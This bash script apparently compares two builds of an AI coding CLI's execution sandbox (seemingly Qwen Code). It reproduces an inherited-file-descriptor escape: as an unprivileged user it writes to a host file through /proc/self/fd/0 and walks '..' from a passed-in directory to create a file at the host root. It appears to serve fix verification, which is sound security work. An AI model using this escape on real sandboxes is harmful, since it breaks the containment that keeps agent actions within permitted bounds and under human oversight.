#!/bin/bash
# Stage world-readable copies so uid 65534 can exec the CLI, then reproduce the inherited-fd escape
# as a non-root user (write a user-owned file outside ws; walk .. to host root).
set -e
V=/root/verify/r7; T=/tmp/r7n
rm -rf $T; mkdir -p $T
cp -a $V/dist-A $T/dist-A; cp -a $V/dist-B $T/dist-B
mkdir -p $T/home $T/ws $T/victims/sub
printf '{"tools":{"executionSandbox":{"backend":"auto","filesystem":"read-only","network":"closed"}}}\n' > $T/home/settings.json
chmod -R go+rX $T; chmod 777 $T/home
run() { # arm
  local ARM=$1
  printf 'nobody-original\n' > $T/victims/owned.txt; chmod 666 $T/victims/owned.txt
  chmod 777 $T/victims $T/ws
  echo "-- arm $ARM: < user-owned host file (outside ws)"
  ( cd $T/ws; setpriv --reuid=65534 --regid=65534 --clear-groups env HOME=$T QWEN_HOME=$T/home \
      QWEN_CODE_SYSTEM_SETTINGS_PATH=/nonexistent QWEN_CODE_SYSTEM_DEFAULTS_PATH=/nonexistent \
      node $T/dist-$ARM/cli.js sandbox -- sh -c 'echo "uid=$(id -u) link=$(readlink /proc/self/fd/0)"; echo via-fd0 > /proc/self/fd/0 && echo fd0-write=ok || echo fd0-blocked' \
      < $T/victims/owned.txt 2>&1 | grep -vE '^(Boundary|Filesystem|Command|Model|Host|Backend|Requested|Effective|Workspace)' )
  echo "   host owned.txt now: $(cat $T/victims/owned.txt | tr -d '\n')"
  echo "-- arm $ARM: < host dir, walk .. to host root"
  ( cd $T/ws; setpriv --reuid=65534 --regid=65534 --clear-groups env HOME=$T QWEN_HOME=$T/home \
      QWEN_CODE_SYSTEM_SETTINGS_PATH=/nonexistent QWEN_CODE_SYSTEM_DEFAULTS_PATH=/nonexistent \
      node $T/dist-$ARM/cli.js sandbox -- sh -c 'echo rooted > /proc/self/fd/0/../../../../../../../..'"$T"'/victims/from-host-root.txt && echo root-walk=ok || echo root-walk-blocked' \
      < $T/victims/sub 2>&1 | grep -vE '^(Boundary|Filesystem|Command|Model|Host|Backend|Requested|Effective|Workspace)' )
  [ -f $T/victims/from-host-root.txt ] && echo "   from-host-root.txt CREATED" || echo "   from-host-root.txt absent"
  rm -f $T/victims/from-host-root.txt
}
run B
run A
rm -rf $T
